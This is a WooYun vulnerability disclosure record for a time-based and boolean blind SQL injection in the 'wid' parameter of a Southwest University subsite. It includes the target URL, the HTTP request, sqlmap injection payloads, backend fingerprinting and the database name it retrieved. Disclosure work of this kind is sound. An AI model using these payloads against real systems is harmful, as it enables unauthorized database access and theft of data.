wybug_title: 西南大学某分站sql注入一枚
wybug_detail:
漏洞详情 披露状态：   									2015-12-24：	细节已通知厂商并且等待厂商处理中									2015-12-25：	厂商已经确认，细节仅向厂商公开									2016-01-04：	细节向核心白帽子及相关领域专家公开									2016-01-14：	细节向普通白帽子公开									2016-01-24：	细节向实习白帽子公开									2016-02-07：	细节向公众公开  简要描述： RT 详细说明：  1.漏洞地址
http://yyyl.swu.edu.cn/
2.漏洞类型
基于时间的布尔类型盲注
3.漏洞利用方式
sqlmap
而且必须要采用包含cookie的HTTP请求包进行注入，sqlmap -r参数4.请求头
GET /doc.php?wid=13008&lid=194 HTTP/1.1Host: yyyl.swu.edu.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-alive
   漏洞证明：  5.漏洞证明
[09:56:22] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: wid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: wid=13008 AND 1286=1286&lid=194    Type: AND/OR time-based blind    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)    Payload: wid=13008 AND 9114=BENCHMARK(5000000,MD5(0x6f6a6756))&lid=194---[09:56:23] [INFO] testing MySQL[09:56:23] [INFO] confirming MySQL[09:56:24] [INFO] the back-end DBMS is MySQLweb application technology: PHP 4.3.11, Apache 1.3.33back-end DBMS: MySQL < 4.0.0[09:56:24] [WARNING] information_schema not available, back-end DBMS is MySQL < 5. database names will be fetched from 'mysql' database[09:56:24] [INFO] fetching number of databases[09:56:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[09:56:24] [INFO] retrieved: [09:56:24] [WARNING] time-based comparison requires larger statistical model, please wait......................[09:56:30] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors [09:56:30] [ERROR] unable to retrieve the number of databases[09:56:30] [INFO] falling back to current database[09:56:30] [INFO] fetching current database[09:56:30] [INFO] retrieved: yyylavailable databases [1]:[*] yyyl
   修复方案：  防护一下   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-25 08:47 厂商回复： 已转给相关单位，谢谢！ 最新状态： 暂无
